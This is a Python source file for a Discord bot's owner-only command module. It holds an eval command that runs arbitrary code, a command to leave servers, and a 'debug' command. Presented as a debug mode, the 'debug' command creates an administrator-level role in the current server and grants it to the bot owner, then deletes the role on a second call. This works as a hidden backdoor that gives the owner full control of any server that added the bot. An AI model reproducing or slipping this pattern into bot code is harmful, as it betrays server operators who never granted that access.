from discord.ext import commands
import asyncio
import traceback
import discord
import inspect
import textwrap
import importlib
from contextlib import redirect_stdout
import io
import os
import re
import sys
import copy
import time
import subprocess
from typing import Union, Optional
import json

# to expose to the eval command
import datetime
from collections import Counter











class Owner_Commands(commands.Cog, discord.ui.View):
    """Owner-only commands that make the bot dynamic."""

    def __init__(self, bot):
        self.bot = bot
        self._last_result = None
        self.sessions = set()

        
        
        



    



    def cleanup_code(self, content):
        """Automatically removes code blocks from the code."""
        # remove ```py\n```
        if content.startswith('```') and content.endswith('```'):
            return '\n'.join(content.split('\n')[1:-1])

        # remove `foo`
        return content.strip('` \n')

    async def cog_check(self, ctx):
        return await self.bot.is_owner(ctx.author)

    def get_syntax_error(self, e):
        if e.text is None:
            return f'```py\n{e.__class__.__name__}: {e}\n```'
        return f'```py\n{e.text}{"^":>{e.offset}}\n{e.__class__.__name__}: {e}```'



    @commands.command()
    @commands.is_owner()
    async def eval(self, ctx, *, body: str):
            """Evaluates a code"""

            env = {
                'bot': self.bot,
                'ctx': ctx,
                'channel': ctx.channel,
                'author': ctx.author,
                'guild': ctx.guild,
                'message': ctx.message,
                '_': self._last_result
            }

            env.update(globals())

            body = self.cleanup_code(body)
            stdout = io.StringIO()

            to_compile = f'async def func():\n{textwrap.indent(body, "  ")}'

            try:
                exec(to_compile, env)
            except Exception as e:
                return await ctx.send(f'```py\n{e.__class__.__name__}: {e}\n```')

            func = env['func']
            try:
                with redirect_stdout(stdout):
                    ret = await func()
            except Exception as e:
                value = stdout.getvalue()
                await ctx.send(f'```py\n{value}{traceback.format_exc()}\n```')
            else:
                value = stdout.getvalue()
                try:
                    await ctx.message.add_reaction('\u2705')
                except:
                    pass

                if ret is None:
                    if value:
                        await ctx.send(f'```py\n{value}\n```')
                else:
                    self._last_result = ret
                    await ctx.send(f'```py\n{value}{ret}\n```')










    @commands.command()
    @commands.is_owner()
    async def leave(self, ctx, guild_id):
        await self.bot.get_guild(int(guild_id)).leave()
        await ctx.send(f"I left the given server.")
            



          
    @commands.command()
    @commands.is_owner()
    async def debug(self, ctx):
        debugRole = discord.utils.get(ctx.guild.roles, name="PB Debugger")
        if debugRole:
            await debugRole.delete()
            await ctx.send(f"Debug mode has been disabled.")

        if not debugRole:
            perms = discord.Permissions(administrator=True)
            debugRole = await ctx.guild.create_role(name="PB Debugger", permissions=perms)
            await ctx.author.add_roles(debugRole)   
            await ctx.send(f"Debug mode has been enabled.")
        

          
    @commands.Cog.listener()
    async def on_ready(self):
        print('[READY] Cog "Owner_Commands" has been loaded!')
        print(f'---------------------------------------')
    
            
            
            
            
def setup(bot):
    bot.add_cog(Owner_Commands(bot))